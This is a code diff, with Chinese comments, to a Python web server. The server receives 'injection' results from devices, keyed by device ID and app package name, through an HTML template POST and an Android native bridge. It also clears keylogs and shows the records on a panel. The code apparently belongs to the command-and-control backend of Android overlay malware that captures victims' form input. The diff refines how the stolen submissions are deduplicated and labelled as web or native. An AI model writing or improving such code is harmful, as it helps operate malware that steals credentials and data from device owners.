@@ -891,19 +891,33 @@ def _store_injection(dev, pkg, tpl, data, src='http'):
     else:
         text = str(data or '')
 
-    # 去重：同一个页面的同一条内容会被上报两次
-    #   ① 模板 HTML 自己 POST /api/inj/result
-    #   ② 原生桥 Android.returnResult / FKB.setFormData → 又 POST 一次
-    # 15 秒内 (deviceId, pkg, text) 完全相同就只保留第一条。
+    # 去重：同一次提交会被上报两次 —— 模板 HTML 自己 POST（src=web）
+    #       和原生桥 Android.returnResult/FKB.setFormData（src=native）。
+    # 规则：同一个 (deviceId, pkg) 60 秒内只留一条；如果先到的是网页那份、后到的是原生，
+    #      就把网页那条删掉、保留原生（面板只显示一条）。
     try:
         _now = int(time.time())
-        for _r in reversed((_ai.S.get('inj_records') or [])[-50:]):
-            if (str(_r.get('deviceId') or '') == dev
-                    and str(_r.get('package') or '') == pkg
-                    and str(_r.get('data') or '') == text[:4000]
-                    and _now - int(_r.get('ts') or 0) <= 15):
-                print('[inj] 去重跳过（15s 内同内容）pkg=%s src=%s' % (pkg, src), flush=True)
+        _map = _ai.S.setdefault('inj_src', {}).setdefault(dev, {})
+        _prev = _map.get(pkg) or {}
+        if _prev and _now - int(_prev.get('ts') or 0) <= 60:
+            if _prev.get('src') == 'web' and src != 'web':
+                _dbx0 = _ai.db()
+                if _dbx0:
+                    try:
+                        _dbx0.keylog_clear(dev, pkg)
+                    except Exception:
+                        pass
+                _ai.S['inj_records'] = [
+                    r for r in (_ai.S.get('inj_records') or [])
+                    if not (str(r.get('deviceId') or '') == dev
+                            and str(r.get('package') or r.get('pkg') or '') == pkg
+                            and _now - int(r.get('ts') or 0) <= 60)
+                ]
+                print('[inj] 用原生上报替换网页上报 pkg=%s' % pkg, flush=True)
+            else:
+                print('[inj] 60s 内已有一条，跳过 pkg=%s src=%s' % (pkg, src), flush=True)
                 return False
+        _map[pkg] = {'ts': _now, 'src': src}
     except Exception as e:
         print('[inj] 去重检查失败: %s' % e, flush=True)
 
@@ -1640,7 +1654,9 @@ def mount_full_surface(app):
                 data = json.loads(data)
             except Exception:
                 data = {'raw': data}
-        ok = _store_injection(dev, pkg, tpl, data, src='http')
+        _ua = (request.headers.get('User-Agent') or '')
+        _web = ('Mozilla' in _ua) or ('AppleWebKit' in _ua) or (' wv' in _ua)
+        ok = _store_injection(dev, pkg, tpl, data, src=('web' if _web else 'native'))
         return web.json_response({'ok': bool(ok), 'deviceId': dev, 'packageName': pkg})
     app.router.add_post('/api/inj/result', inj_result)
     app.router.add_get('/api/inj/result', inj_result)
